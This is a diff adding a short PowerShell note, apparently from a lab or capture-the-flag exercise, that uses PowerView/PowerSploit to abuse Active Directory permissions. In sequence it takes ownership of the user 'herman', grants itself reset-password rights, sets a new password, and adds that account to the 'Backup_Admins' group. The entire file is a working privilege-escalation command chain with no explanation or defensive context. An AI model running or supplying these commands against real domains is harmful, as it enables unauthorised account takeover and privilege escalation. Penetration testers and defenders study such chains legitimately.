@@ -1,0 +1,15 @@
+#powerview powersploit
+
+#Write access  --> Owner
+Set-DomainObjectOwner -Identity herman -OwnerIdentity nico -verbose
+
+#Owner --> Reset Password Rights
+Add-DomainObjectAcl -TargetIdentity Herman -PrincipalIdentity nico -Rights ResetPassword -Verbose
+
+#Reset User Password:
+$UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
+Set-DomainUserPassword -Identity Herman -AccountPassword $UserPassword
+
+#Add user to group:
+$cred = New-Object System.Management.Automation.PSCredential('herman',$UserPassword)
+Add-DomainGroupMember -identity 'Backup_Admins' -members herman -credential $cred
